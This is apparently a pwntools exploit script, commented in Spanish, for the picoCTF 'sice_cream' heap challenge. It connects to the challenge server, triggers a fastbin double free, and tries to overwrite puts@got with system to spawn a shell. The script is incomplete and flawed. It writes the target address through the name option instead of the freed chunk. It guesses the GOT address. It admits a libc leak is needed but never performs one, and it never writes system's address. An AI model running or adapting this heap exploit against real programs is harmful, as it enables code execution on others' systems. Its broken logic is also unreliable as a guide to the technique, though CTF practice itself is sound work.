#!/usr/bin/env python3
from pwn import *

context.binary = './sice_cream'
context.log_level = 'info'

# Conectar remoto
p = remote('jupiter.challenges.picoctf.org', 9521)

# Esperar menú inicial
p.recvuntil(b'name?')
p.sendline(b'hacker')

def buy(size):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'How much?', str(size).encode())
    
def eat(idx):
    p.sendlineafter(b'>', b'2') 
    p.sendlineafter(b'Which one?', str(idx).encode())
    
def reintroduce(data):
    p.sendlineafter(b'>', b'3')
    p.sendafter(b'name?', data)

# Estrategia: Double Free para control de heap
# Luego sobrescribir GOT o hook

log.info("Creando chunks...")

# Crear varios chunks
buy(0x20)  # idx 0
buy(0x20)  # idx 1  
buy(0x20)  # idx 2

# Double free - fastbin dup
log.info("Triggering double free...")
eat(0)  # free(0)
eat(1)  # free(1) - evitar detección
eat(0)  # free(0) otra vez - double free!

# Ahora el fastbin tiene: 0 -> 1 -> 0
# Podemos allocar y controlar el siguiente puntero

log.info("Explotando double free...")

# Allocar y escribir dirección objetivo
# Intentemos sobrescribir puts@got con system
got_puts = 0x602020  # Dirección típica de puts@got

buy(0x20)  # Obtiene chunk 0
reintroduce(p64(got_puts))  # Escribe dirección de GOT en el chunk

buy(0x20)  # Obtiene chunk 1
buy(0x20)  # Obtiene chunk 0 otra vez
buy(0x20)  # ¡Obtiene puts@got como chunk!

# Ahora podemos escribir en puts@got
# Necesitamos leak de libc primero

log.info("Intentando obtener shell...")

# Escribir "/bin/sh" en el nombre
p.sendlineafter(b'>', b'3')
p.sendafter(b'name?', b'/bin/sh\x00')

# Trigger puts que ahora es system
p.sendlineafter(b'>', b'4')  # Opción que no existe, triggerea puts de error

# Si no funciona, intentar interactivo
p.interactive()